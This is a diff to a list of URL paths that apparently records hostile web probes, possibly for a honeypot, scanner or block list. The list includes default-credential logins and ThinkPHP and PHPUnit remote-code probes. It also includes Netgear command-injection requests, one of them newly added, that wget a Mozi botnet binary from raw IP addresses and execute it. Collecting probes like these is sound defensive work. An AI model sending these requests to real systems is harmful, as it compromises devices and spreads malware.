@@ -3,6 +3,7 @@
 /Telerik.Web.UI.WebResource.axd?type=rau
 /boaform/admin/formLogin?username=user&psd=user
 /boaform/admin/formLogin?username=adminisp&psd=adminisp
+/boaform/admin/formLogin?username=ec8&psd=ec8
 /remote/login
 /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f
 /.git/HEAD
@@ -11,13 +12,18 @@
 /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
 /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.226.7.235:41803/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.61.179.220:50665/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /api/jsonws/invoke
 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 /solr/
+/solr/admin/info/system?wt=json 
 /api/jsonws/invoke
 /admin//config.php
 /ReportServer
 /dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB
+/login/companyInfo/seriously
+/api/user/all
+/pv/000000000000.cfg
 
 /.env
 #re /.*/.env
